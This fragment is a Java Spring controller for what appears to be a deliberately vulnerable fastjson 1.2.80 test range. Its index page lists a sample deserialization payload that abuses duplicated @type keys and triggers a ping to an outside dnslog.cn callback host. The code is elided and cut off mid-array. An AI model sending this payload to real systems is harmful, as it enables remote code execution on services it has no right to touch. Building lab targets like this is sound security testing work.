...
public class FastjsonController {
    ...
    @GetMapping(value = {"/", "/fastjson-1.2.80"}, produces = "text/html;charset=UTF-8")
    @ResponseBody
    public String index() {
        return buildPage("fastjson-1.2.80 靶场测试页", "/fastjson1.2.80-process", new String[]{
                "{\"@type\": \"java.lang.Exception\",\"@type\": \"myapp.Poc\",\"name\": \"ping fastjson1.2.80-process.dnslog.cn\"}"
